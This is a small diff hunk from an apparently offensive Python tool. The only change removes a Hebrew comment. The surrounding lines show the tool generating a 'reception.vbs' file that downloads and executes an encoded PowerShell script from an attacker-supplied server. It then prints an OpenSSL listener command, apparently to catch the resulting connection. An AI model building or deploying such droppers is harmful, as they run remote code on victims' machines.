@@ -209,7 +209,7 @@ if __name__ == "__main__":
 
         # Generate the VBS file to download and execute the PS1 file securely
         output_file = "reception.vbs"
-        generate_vbs_with_encoded_ps1(args.server, output_file)  # עדכון לשם הנכון
+        generate_vbs_with_encoded_ps1(args.server, output_file) 
 
     print(f"{Fore.CYAN}To start an OpenSSL listener, run:\n{Fore.GREEN}openssl s_server -accept {args.port} -cert {cert_file} -key {key_file} -quiet{Style.RESET_ALL}")
 
